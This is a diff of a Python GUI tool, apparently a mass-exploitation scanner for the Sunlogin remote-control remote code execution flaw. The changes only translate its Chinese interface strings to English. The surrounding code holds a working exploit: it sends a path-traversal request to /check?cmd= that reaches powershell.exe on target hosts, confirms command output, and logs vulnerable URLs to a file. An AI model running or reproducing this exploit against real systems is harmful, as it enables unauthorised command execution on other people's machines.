@@ -22,7 +22,7 @@ def xrk_rce(address):
         cid = re.findall('"verify_string":"(.*?)",', res_cid.text)
         payload = "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20"
         url = "http://" + address + payload
-        xrk_text.insert(END, chars="【~~~】开始检测： " + unquote(url, "utf-8") + "\n")
+        xrk_text.insert(END, chars="[~~~]Start detection: " + unquote(url, "utf-8") + " \n")
         xrk_text.see(END)
         data = {
             'Host': address,
@@ -36,21 +36,21 @@ def xrk_rce(address):
         }
         res = requests.get(url, headers=data, timeout=10)
         if "Windows IP" in res.text:
-            xrk_text.insert(END, chars="【！！！】存在漏洞的url为：" + unquote(url, "utf-8") + "\n")
+            xrk_text.insert(END, chars="[! ! ! ! ! ! ] Vulnerable url:" + unquote(url, "utf-8") + "\n")
             xrk_text.see(END)
             xrk_text.insert(END, chars=res.text + "\n")
             xrk_text.see(END)
-            with open("存在向日葵rce漏洞的url", "a+") as h:
-                h.write("存在漏洞的url为： " + url)
+            with open("[exists]xrk_RCE_url", "a+") as h:
+                h.write("[exists]xrk_RCE_url: " + url)
             h.close()
     except Exception as e:
-        xrk_text.insert(END, chars="【×××】" + unquote(url, "utf-8") + "不存在漏洞\n")
+        xrk_text.insert(END, chars="【×××】" + unquote(url, "utf-8") + "has no vulnerability.\n")
         xrk_text.see(END)
 
 def xrk_rce_gui():
     xrk_gui = Toplevel()
     xrk_gui.geometry("1035x455")
-    xrk_gui.title("向日葵RCE一把梭")
+    xrk_gui.title("Sunlogin RCE [auto-muti-exp]")
     xrk_gui.resizable(0, 0)
     logo = PhotoImage(file="./logo.ico")
     xrk_gui.tk.call('wm', 'iconphoto', xrk_gui._w, logo)
